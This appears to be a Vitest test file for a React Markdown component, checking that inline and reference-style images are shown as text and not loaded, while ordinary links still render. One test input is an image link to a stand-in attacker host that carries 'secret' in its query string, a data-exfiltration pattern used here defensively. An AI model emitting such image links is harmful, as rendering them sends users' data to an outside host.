// @vitest-environment jsdom
import { act } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, describe, expect, it } from "vitest";

import { Markdown } from "./Markdown.js";

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

const container = document.createElement("div");
document.body.append(container);
const root = createRoot(container);
afterEach(() => act(() => root.render(null)));

async function render(markdown: string) {
  await act(async () => root.render(<Markdown>{markdown}</Markdown>));
}

describe("Markdown images", () => {
  it("shows an inline image as text instead of loading it", async () => {
    await render("Done ![logo](https://evil.test/x.png?d=secret)");

    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[image: logo] https://evil.test/x.png?d=secret");
    expect(container.querySelector("a")).toBeNull();
  });

  it("shows a reference-style image as text instead of loading it", async () => {
    await render("Done ![logo][ref]\n\n[ref]: https://evil.test/y.png");

    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[image: logo] https://evil.test/y.png");
  });

  it("still renders an ordinary link as a link", async () => {
    await render("See [the guide](https://example.com/guide)");

    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.com/guide");
    expect(link?.getAttribute("target")).toBe("_blank");
  });
});
